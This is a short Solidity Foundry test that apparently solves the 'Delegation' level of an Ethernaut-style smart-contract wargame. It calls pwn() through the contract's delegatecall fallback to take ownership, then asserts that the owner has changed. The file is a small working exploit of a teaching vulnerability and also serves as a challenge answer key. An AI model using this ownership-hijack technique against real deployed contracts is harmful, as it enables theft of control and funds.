// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/06_Delegation.sol";

contract AttackerDelegationTest is Test {
    function testDelegation() external {
        vm.prank(address(1));
        Delegate delegate = new Delegate(address(2));

        vm.prank(address(2));
        Delegation delegation = new Delegation(address(delegate));

        assertFalse(delegation.owner() == address(this));
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Call failed");
        assertTrue(delegation.owner() == address(this));
    }
}
